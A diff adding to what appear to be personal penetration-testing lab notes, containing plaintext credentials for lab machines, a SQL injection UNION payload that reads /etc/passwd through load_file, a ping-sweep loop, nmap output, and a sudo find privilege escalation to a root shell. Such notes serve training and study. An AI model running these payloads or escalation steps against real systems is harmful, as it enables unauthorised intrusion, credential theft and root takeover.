@@ -163,7 +163,53 @@ HAM 	32 	$15
 
 
 
+
+CREDS
+--------
+box 1
+
+user2:EaglesIsARE78
+
+Aaron:apasswordyPa$$word 		#username and pw for box 2
+user3:Bob4THEEapples
+
+
+LOADING A FILE FROM SQL INJECTION GET METHOD
+-------------------------------------------
+
+
+http://localhost:11155/pick.php?product=7%20UNION%20select%201,2,load_file(%27/etc/passwd%27)
+
 ```
+
+
+
+from the PublicWebSite:
+
+
+	for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+		# this will show you boxes to check out next. remember to do ping sweeps on each network you come across
+		
+
+nmap scan against the 192.168.28.172
+
+Nmap scan report for 192.168.28.172
+Host is up (0.0012s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+
+
+OK, TAKE A DEEP BREATH; YOU MADE IT TOO ROUNDSENSOR
+
+
+now time for privesc
+
+first look in sudo -l. we see that we can run the find command with sudo without a password. now check gtfobins and you cn see you can give yourself a bash shell with root like this:
+
+	> sudo find . -exec /bin/bash \; -quit
+	
 
 
 
